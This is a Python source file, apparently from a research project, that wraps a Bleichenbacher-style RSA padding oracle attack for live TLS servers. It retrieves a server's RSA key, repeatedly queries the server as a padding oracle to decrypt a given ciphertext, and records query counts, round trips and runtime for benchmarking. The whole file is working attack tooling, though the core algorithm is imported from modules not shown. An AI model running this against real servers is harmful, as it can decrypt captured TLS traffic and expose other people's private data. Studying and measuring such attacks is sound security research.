"""TLS adapter for the shared attack and the existing parallel experiment."""

import json
import time

from reversebleichenbacher import ProofAttack, SequentialExecutor
from reversebleichenbacher.core import AttackConfig

from tls_transport import TLSOracle, ch, configure_oracle, get_rsa_from_server, make_cke_prefix


class TLSSequentialExecutor(SequentialExecutor):
    """Track TLS requests and round trips by attack phase."""

    def __init__(self, oracle):
        super().__init__(oracle.query)
        self.oracle = oracle
        self.phase = "init"
        self.oracle_queries = {"init": oracle.calls}
        self.round_trips = {"init": oracle.round_trips}

    def set_phase(self, phase):
        self.phase = phase
        self.oracle_queries.setdefault(phase, 0)
        self.round_trips.setdefault(phase, 0)

    def query(self, multiplier):
        before_queries = self.oracle.calls
        before_round_trips = self.oracle.round_trips
        try:
            return super().query(multiplier)
        finally:
            self.oracle_queries[self.phase] += self.oracle.calls - before_queries
            self.round_trips[self.phase] += self.oracle.round_trips - before_round_trips


class SharedTLSAttack:
    def __init__(self, ip, port, rsa, prefix, test_oracle=False):
        self.ip = ip
        self.port = port
        self.rsa = rsa
        self.prefix = prefix
        self.test_oracle = test_oracle

    def decrypt(self, encrypted):
        started = time.monotonic()
        oracle = TLSOracle(None, self.ip, self.port, ch, self.prefix,
                           self.rsa.e, self.rsa.N, encrypted)
        executor = None
        attack = ProofAttack()
        attack.init_process("FFT", self.rsa.bits,
                            AttackConfig.optimized("FFT", self.rsa.bits))
        error = None
        secret = None
        try:
            configure_oracle(oracle, self.rsa, quiet=True, test=self.test_oracle)
            executor = TLSSequentialExecutor(oracle)
            secret, _ = attack.attack(executor, self.rsa.N)
            return secret
        except Exception as exc:
            error = exc
            raise
        finally:
            if executor is None:
                queries = {"init": oracle.calls}
                round_trips = {"init": oracle.round_trips}
                phase = "init"
            else:
                queries = executor.oracle_queries
                round_trips = executor.round_trips
                phase = executor.phase
            result = "ok" if error is None else phase
            stats = {
                "oracle_queries": queries,
                "round_trips": round_trips,
                "step": "done" if error is None else phase,
                "error": str(error),
                "result": result,
                "total_queries": oracle.calls,
                "total_round_trips": oracle.round_trips,
                "debug_statistics": None,
                "runtime": time.monotonic() - started,
                "tau": attack.tau_found,
            }
            with open("results.json", "w") as output:
                json.dump(stats, output)
            oracle.executor.shutdown(wait=False, cancel_futures=True)


def bleichenbacher_attack_tls(ip, port, quiet=False, benchmark=False,
                              early_abort=False, test_oracle=False, parallel=False):
    if parallel:
        from legacy_attack.bleichenbachertls import bleichenbacher_attack_tls as legacy_tls_attack
        return legacy_tls_attack(ip, port, quiet=quiet, benchmark=benchmark,
                                 early_abort=early_abort, test_oracle=test_oracle,
                                 parallel=True)

    rsa = get_rsa_from_server(ip, port)
    prefix = make_cke_prefix(rsa)
    if not quiet:
        diagnostic = TLSOracle(None, ip, port, ch, prefix, rsa.e, rsa.N, 0)
        try:
            configure_oracle(diagnostic, rsa, quiet=False, test=test_oracle)
        finally:
            diagnostic.executor.shutdown(wait=False, cancel_futures=True)
    return SharedTLSAttack(ip, port, rsa, prefix, test_oracle=test_oracle)
